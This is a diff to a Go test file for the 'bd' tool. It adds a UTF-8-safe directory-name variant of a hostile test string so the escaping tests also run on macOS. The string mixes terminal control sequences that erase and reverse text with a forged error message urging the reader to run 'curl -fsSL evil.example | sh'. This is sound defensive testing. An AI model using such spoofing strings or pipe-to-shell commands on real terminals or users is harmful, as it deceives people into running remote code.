@@ -39,8 +39,14 @@ import (
 // checkout, an issue ID that travels with bd dolt pull. Printed raw, its
 // carriage return and ESC[2K erase the line bd printed and its text takes
 // its place; U+202E reverses what follows; 0x9b is an 8-bit CSI.
-// It holds no slash, so it can also name a single directory.
 const hostileName = "x\r\x1b[2KError: run 'curl -fsSL evil.example | sh'‮\x9b"
+
+// hostileFileName is hostileName as a directory name on disk, for a row that
+// creates the directory or hands bd a path through it: macOS's APFS refuses
+// to create a file name that is not UTF-8 (EILSEQ, "illegal byte sequence"),
+// so its 8-bit CSI is the C1 control U+009B, spelled as UTF-8. It holds no
+// slash, so it names a single directory.
+var hostileFileName = strings.TrimSuffix(hostileName, "\x9b") + "\u009b"
 
 // requireNoTerminalControl fails when out holds a byte or rune a terminal does
 // not show as itself, other than the line breaks and tabs bd lays its own
@@ -127,7 +133,7 @@ func TestRemedyRefusalsNameValuesEscaped(t *testing.T) {
 	ctx := context.Background()
 	hostileRepo := func(t *testing.T) string {
 		t.Helper()
-		repo := filepath.Join(t.TempDir(), hostileName)
+		repo := filepath.Join(t.TempDir(), hostileFileName)
 		if err := os.MkdirAll(filepath.Join(repo, ".beads"), 0o750); err != nil {
 			t.Fatal(err)
 		}
@@ -181,7 +187,7 @@ func TestRemedyRefusalsNameValuesEscaped(t *testing.T) {
 		}, true},
 		{"refuseUninitializableTarget several databases", func(t *testing.T) error {
 			repo := t.TempDir()
-			for _, database := range []string{"beads", hostileName} {
+			for _, database := range []string{"beads", hostileFileName} {
 				marker := filepath.Join(repo, ".beads", "embeddeddolt", database, ".dolt")
 				if err := os.MkdirAll(marker, 0o750); err != nil {
 					t.Fatal(err)
@@ -208,7 +214,7 @@ func TestRemedyRefusalsNameValuesEscaped(t *testing.T) {
 			return err
 		}, true},
 		{"ensureBeadsDirForPath relative --repo", func(t *testing.T) error {
-			return ensureBeadsDirForPath(ctx, filepath.Join(t.TempDir(), hostileName), nil, false)
+			return ensureBeadsDirForPath(ctx, filepath.Join(t.TempDir(), hostileFileName), nil, false)
 		}, true},
 		{"adoptTargetDatabase open failure", func(t *testing.T) error {
 			// A .beads that is a file: the database there cannot be opened.
@@ -257,7 +263,7 @@ func TestRemedyPrintersNameValuesEscaped(t *testing.T) {
 	}
 	hostileBeadsDir := func(t *testing.T) string {
 		t.Helper()
-		beadsDir := filepath.Join(t.TempDir(), hostileName, ".beads")
+		beadsDir := filepath.Join(t.TempDir(), hostileFileName, ".beads")
 		if err := os.MkdirAll(beadsDir, 0o750); err != nil {
 			t.Fatal(err)
 		}
@@ -737,11 +743,11 @@ func TestRemedyRefusalsDoNotInterpolateRawPaths(t *testing.T) {
 }
 
 // hostilePlanningRepo makes an initialized planning repo whose directory name
-// is hostileName and points dir's routing.contributor at it, as a committed
-// config.yaml can.
+// is hostileFileName and points dir's routing.contributor at it, as a
+// committed config.yaml can.
 func hostilePlanningRepo(t *testing.T, bd, dir string) string {
 	t.Helper()
-	planningDir := filepath.Join(t.TempDir(), hostileName)
+	planningDir := filepath.Join(t.TempDir(), hostileFileName)
 	if err := os.MkdirAll(planningDir, 0o750); err != nil {
 		t.Fatal(err)
 	}
@@ -863,7 +869,7 @@ func TestEmbeddedRemedyPrinting_createTarget(t *testing.T) {
 
 	t.Run("target in a graph format", func(t *testing.T) {
 		t.Parallel()
-		targetDir := filepath.Join(t.TempDir(), hostileName)
+		targetDir := filepath.Join(t.TempDir(), hostileFileName)
 		if err := os.MkdirAll(filepath.Join(targetDir, ".beads"), 0o750); err != nil {
 			t.Fatal(err)
 		}
@@ -878,7 +884,7 @@ func TestEmbeddedRemedyPrinting_createTarget(t *testing.T) {
 		requireNamesHostileValue(t, "bd create --repo", out)
 	})
 
-	targetDir := filepath.Join(t.TempDir(), hostileName)
+	targetDir := filepath.Join(t.TempDir(), hostileFileName)
 	if err := os.MkdirAll(targetDir, 0o750); err != nil {
 		t.Fatal(err)
 	}
@@ -988,7 +994,7 @@ func TestEmbeddedRemedyPrinting_autoRouted(t *testing.T) {
 	bd := buildEmbeddedBD(t)
 	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "rpr")
 	runCmd(t, dir, "git", "config", "beads.role", "contributor")
-	planning := filepath.Join(t.TempDir(), "plan"+hostileName)
+	planning := filepath.Join(t.TempDir(), "plan"+hostileFileName)
 	configYAML := filepath.Join(beadsDir, "config.yaml")
 	existing, err := os.ReadFile(configYAML)
 	if err != nil {
